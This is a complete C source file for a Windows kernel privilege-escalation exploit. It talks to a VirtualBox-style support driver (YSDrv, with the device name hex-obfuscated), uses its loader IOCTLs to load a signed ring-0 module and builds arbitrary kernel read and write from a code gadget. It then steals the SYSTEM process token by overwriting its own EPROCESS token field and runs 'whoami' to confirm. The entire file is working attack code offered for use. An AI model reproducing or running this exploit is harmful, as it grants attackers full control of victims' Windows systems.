#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define CTRL(f,a) ((0x22u<<16)|((a)<<14)|(((f)|128u)<<2))
typedef struct { uint32_t ck, sk, cbIn, cbOut, fFlags; int32_t rc; } HDR;

static HANDLE h;
static uint32_t devck, sess, nfunc;
static unsigned char* qb;
static uint64_t psess, pvm, image, K1, K2, U1, U2, copyStr, gadget;

static uint64_t sym(const char* n) {
  for (uint32_t i = 0; i < nfunc && i < 512; i++) {
    char* e = (char*)(qb + 32 + (size_t)i * 40);
    if (!strncmp(e, n, 31)) return *(uint64_t*)(e + 32);
  }
  return 0;
}
static uint32_t erx(const unsigned char* m, uint32_t lf, const char* w) {
  uint32_t er = *(uint32_t*)(m + lf + 136);
  if (!er) return 0;
  uint32_t nn = *(uint32_t*)(m + er + 24), pn = *(uint32_t*)(m + er + 32);
  uint32_t po = *(uint32_t*)(m + er + 36), pf = *(uint32_t*)(m + er + 28);
  for (uint32_t i = 0; i < nn && i < 4096; i++) {
    const char* nm = (const char*)(m + *(uint32_t*)(m + pn + i * 4));
    if (nm[0] && !strncmp(nm, w, 63)) {
      uint16_t o = *(uint16_t*)(m + po + i * 2);
      return *(uint32_t*)(m + pf + o * 4);
    }
  }
  return 0;
}
static int32_t call(uint64_t v6, uint64_t a32, uint64_t a64) {
  unsigned char b[0x100]; memset(b, 0, sizeof(b)); HDR* x = (HDR*)b;
  *(uint64_t*)(b + 24) = pvm;
  *(uint32_t*)(b + 32) = 0xFFFFFFFD;
  *(uint32_t*)(b + 36) = 320;
  *(uint32_t*)(b + 48) = 426967569;
  *(uint32_t*)(b + 52) = 32;
  *(uint64_t*)(b + 56) = v6;
  *(uint64_t*)(b + 64) = a32;
  *(uint64_t*)(b + 72) = a64;
  x->ck = devck; x->sk = sess; x->cbIn = 80; x->cbOut = 80; x->fFlags = 0x42000042;
  DWORD r = 0;
  return DeviceIoControl(h, 0x22826C, b, 80, b, 80, &r, NULL) ? x->rc : -1;
}
static uint64_t rd(uint64_t a) {
  uint64_t v = 0; int o = 0;
  while (o < 8) {
    volatile uint64_t* k = (volatile uint64_t*)U2;
    memset((void*)U2, 0, 0x100);
    k[0x88/8] = pvm; k[0xA8/8] = copyStr;
    call(K2, 9, a + o);
    unsigned char* b = (unsigned char*)U2; int g = 0;
    for (int i = 0; i < 8 - o; i++) {
      v |= (uint64_t)b[i] << ((o + i) * 8);
      if (!b[i]) { g = i + 1; break; }
    }
    if (!g) break;
    o += g;
  }
  return v;
}
static void wr32(uint64_t a, uint32_t v) {
  volatile uint64_t* k = (volatile uint64_t*)U1;
  k[0x88/8] = pvm; k[0xA8/8] = gadget;
  call(K1, (uint64_t)v, a);
}
static void wr64(uint64_t a, uint64_t v) { wr32(a, (uint32_t)v); wr32(a + 4, (uint32_t)(v >> 32)); }

int main(int argc, char** argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  if (argc < 2) { printf("usage: %s <YSR0.sys>\n", argv[0]); return 1; }
  printf("[*] target=%s\n", argv[1]);

  HANDLE f = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (f == INVALID_HANDLE_VALUE) return 1;
  static unsigned char raw[8*1024*1024]; DWORD got = 0;
  ReadFile(f, raw, sizeof(raw), &got, NULL); CloseHandle(f);
  if (got < 0x200) return 1;
  uint32_t lf = *(uint32_t*)(raw + 0x3C);
  uint16_t nsec = *(uint16_t*)(raw + lf + 6), optsz = *(uint16_t*)(raw + lf + 20);
  uint32_t IMG = *(uint32_t*)(raw + lf + 80), hdrsz = *(uint32_t*)(raw + lf + 84);
  uint64_t pref = *(uint64_t*)(raw + lf + 48);

  static const wchar_t dev[] = { 0x5C,0x5C,0x3F,0x5C,0x47,0x4C,0x4F,0x42,0x41,0x4C,0x52,0x4F,0x4F,0x54,0x5C,
    0x44,0x65,0x76,0x69,0x63,0x65,0x5C,0x59,0x53,0x44,0x72,0x76,0x00 };
  h = CreateFileW(dev, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (h == INVALID_HANDLE_VALUE) return 2;
  DWORD ret = 0;
  unsigned char cb[64]; memset(cb, 0, sizeof(cb)); HDR* ch = (HDR*)cb;
  ch->ck = 0x69726F74; ch->sk = 0x11223344; ch->cbIn = 48; ch->cbOut = 56; ch->fFlags = 0x42000042;
  memcpy(cb + 24, "The Magic Word!", 16);
  *(uint32_t*)(cb + 40) = 0x290001; *(uint32_t*)(cb + 44) = 0x290001;
  if (!DeviceIoControl(h, 0x228204, cb, 48, cb, 56, &ret, NULL) || ch->rc) return 3;
  devck = *(uint32_t*)(cb + 24); sess = *(uint32_t*)(cb + 28);
  psess = *(uint64_t*)(cb + 48);
  printf("[+] COOKIE ok\n");
  qb = (unsigned char*)calloc(1, 12000);
  HDR* qh = (HDR*)qb; qh->ck = devck; qh->sk = sess; qh->cbIn = 24; qh->cbOut = 11032; qh->fFlags = 0x42000042;
  if (!DeviceIoControl(h, 0x228208, qb, 24, qb, 11032, &ret, NULL) || qh->rc) return 3;
  nfunc = *(uint32_t*)(qb + 24);
  printf("[+] QUERY_FUNCS ok (cFunctions=%u)\n", nfunc);
  copyStr = sym("RTStrCopy");
  if (!copyStr) return 3;

  uint32_t CBE = IMG + 0x1000;
  unsigned char ob[512]; memset(ob, 0, sizeof(ob)); HDR* oh = (HDR*)ob;
  oh->ck = devck; oh->sk = sess; oh->cbIn = 328; oh->cbOut = 40; oh->fFlags = 0x42000042;
  *(uint32_t*)(ob + 24) = CBE; *(uint32_t*)(ob + 28) = IMG;
  strncpy((char*)(ob + 32), "nox", 31);
  strncpy((char*)(ob + 64), argv[1], 259);
  if (!DeviceIoControl(h, 0x22820C, ob, 328, ob, 40, &ret, NULL) || oh->rc) return 4;
  image = *(uint64_t*)(ob + 24);
  gadget = image + 0xCEE56ULL;
  printf("[+] LDR_OPEN ok\n");

  uint32_t total = 108 + CBE;
  unsigned char* lb = (unsigned char*)calloc(1, total);
  unsigned char* img = lb + 108;
  if (hdrsz > IMG) hdrsz = IMG;
  memcpy(img, raw, hdrsz);
  for (uint16_t i = 0; i < nsec; i++) {
    const unsigned char* sh = raw + lf + 24 + optsz + (uint32_t)i * 40;
    uint32_t vs = *(uint32_t*)(sh + 8), rva = *(uint32_t*)(sh + 12);
    uint32_t rsz = *(uint32_t*)(sh + 16), roff = *(uint32_t*)(sh + 20);
    uint32_t n = (vs && vs < rsz) ? vs : rsz;
    if (rva >= IMG) continue;
    if (rva + n > IMG) n = IMG - rva;
    if (roff + n <= got) memcpy(img + rva, raw + roff, n);
  }
  int64_t delta = (int64_t)image - (int64_t)pref;
  uint32_t relRva = *(uint32_t*)(raw + lf + 176), relSz = *(uint32_t*)(raw + lf + 180);
  for (uint32_t off = 0; relRva && off + 8 <= relSz; ) {
    uint32_t page = *(uint32_t*)(img + relRva + off);
    uint32_t bs = *(uint32_t*)(img + relRva + off + 4);
    if (bs < 8 || off + bs > relSz) break;
    for (uint32_t e = 8; e + 2 <= bs; e += 2) {
      uint16_t ent = *(uint16_t*)(img + relRva + off + e);
      if ((ent >> 12) != 10) continue;
      uint32_t t = page + (ent & 0xFFF);
      if (t + 8 <= IMG) *(uint64_t*)(img + t) += delta;
    }
    off += bs;
  }
  *(uint64_t*)(img + lf + 48) = image;
  for (uint32_t off = 0; off + 8 <= IMG; off += 8) {
    uint64_t v = *(uint64_t*)(img + off);
    if (v < 0x200 || v >= IMG - 4) continue;
    const char* nm = (const char*)(img + (uint32_t)v + 2);
    uint64_t a = sym(nm);
    if (!a) { nm = (const char*)(img + (uint32_t)v); a = sym(nm); }
    if (a) *(uint64_t*)(img + off) = a;
  }

  uint32_t mi = erx(img, lf, "ModuleInit"), mf = erx(img, lf, "VMMR0EntryFast"), me = erx(img, lf, "VMMR0EntryEx");
  if (!mi || !mf || !me) return 5;
  HDR* lh = (HDR*)lb; lh->ck = devck; lh->sk = sess; lh->cbIn = total; lh->cbOut = 2080; lh->fFlags = 0x42000042;
  *(uint64_t*)(lb + 24) = image + mi;
  *(uint64_t*)(lb + 40) = image + mi;
  *(uint64_t*)(lb + 48) = image + mf;
  *(uint64_t*)(lb + 56) = image + me;
  *(uint64_t*)(lb + 72) = image;
  *(uint32_t*)(lb + 80) = 1;
  *(uint32_t*)(lb + 84) = IMG;
  *(uint32_t*)(lb + 104) = CBE;
  if (!DeviceIoControl(h, 0x228210, lb, total, lb, 2080, &ret, NULL) || lh->rc) return 6;
  printf("[+] LDR_LOAD ok (signed YSR0 loaded)\n");

  unsigned char b[0x100]; memset(b, 0, sizeof(b)); HDR* bh = (HDR*)b;
  unsigned char* vr = b + 48; uint32_t c = 48 + 40;
  *(uint32_t*)(b + 32) = 0xFFFFFFFD; *(uint32_t*)(b + 36) = 32;
  *(uint32_t*)(vr + 0) = 426967569; *(uint32_t*)(vr + 4) = 40;
  *(uint64_t*)(vr + 8) = psess; *(uint32_t*)(vr + 16) = 1;
  bh->ck = devck; bh->sk = sess; bh->cbIn = c; bh->cbOut = c; bh->fFlags = 0x42000042;
  if (!DeviceIoControl(h, 0x22826C, b, c, b, c, &ret, NULL) || bh->rc) return 7;
  pvm = *(uint64_t*)(vr + 32);
  memset(b, 0, sizeof(b)); bh = (HDR*)b; *(uint64_t*)(b + 24) = pvm;
  bh->ck = devck; bh->sk = sess; bh->cbIn = 32; bh->cbOut = 24; bh->fFlags = 0x42000042;
  if (!DeviceIoControl(h, 0x22824C, b, 32, b, 24, &ret, NULL) || bh->rc) return 7;
  printf("[+] create-VM ok\n[+] SET_VM_FOR_FAST ok\n");

  for (uint32_t np = 1; np <= 2; np++) {
    unsigned char ab[0x200]; memset(ab, 0, sizeof(ab)); HDR* ah = (HDR*)ab;
    uint32_t cbo = 8 * np + 40;
    *(uint32_t*)(ab + 24) = np; *(uint8_t*)(ab + 28) = 1; *(uint8_t*)(ab + 29) = 1;
    ah->ck = devck; ah->sk = sess; ah->cbIn = 32; ah->cbOut = cbo; ah->fFlags = 0x42000042;
    if (!DeviceIoControl(h, 0x228228, ab, 32, ab, cbo, &ret, NULL) || ah->rc) return 8;
    if (np == 1) { U1 = *(uint64_t*)(ab + 24); K1 = *(uint64_t*)(ab + 32); }
    else         { U2 = *(uint64_t*)(ab + 24); K2 = *(uint64_t*)(ab + 32); }
  }

  uint64_t self = rd(psess + 0x30);
  if ((uint32_t)rd(self + 0x1D0) != GetCurrentProcessId()) return 9;
  uint64_t tok = 0, link = rd(self + 0x1D8);
  for (int i = 0; i < 4096 && link; i++) {
    uint64_t e = link - 0x1D8;
    if (rd(e + 0x1D0) == 4) { tok = rd(e + 0x248); break; }
    uint64_t next = rd(link);
    if (!next || next == link) break;
    link = next;
  }
  if (!tok) return 10;
  printf("[+] System EPROCESS / Token found\n");
  printf("[*] swapping EPROCESS->Token with System token ...\n");
  wr64(self + 0x248, tok);

  HANDLE t;
  int last = -1;
  if (OpenProcessToken(GetCurrentProcess(), 0x0008, &t)) {
    unsigned char tb[256]; DWORD tl = 0;
    if (GetTokenInformation(t, 1, tb, sizeof(tb), &tl)) {
      unsigned char* s = (unsigned char*)((uint64_t*)tb)[0];
      unsigned n = s[1];
      if (n) last = (int)*(unsigned long*)(s + 8 + 4 * (n - 1));
    }
    CloseHandle(t);
  }
  if (last == 18) printf("[*] verifying ... SYSTEM (S-1-5-18)\n");
  system("whoami");
  return 0;
}
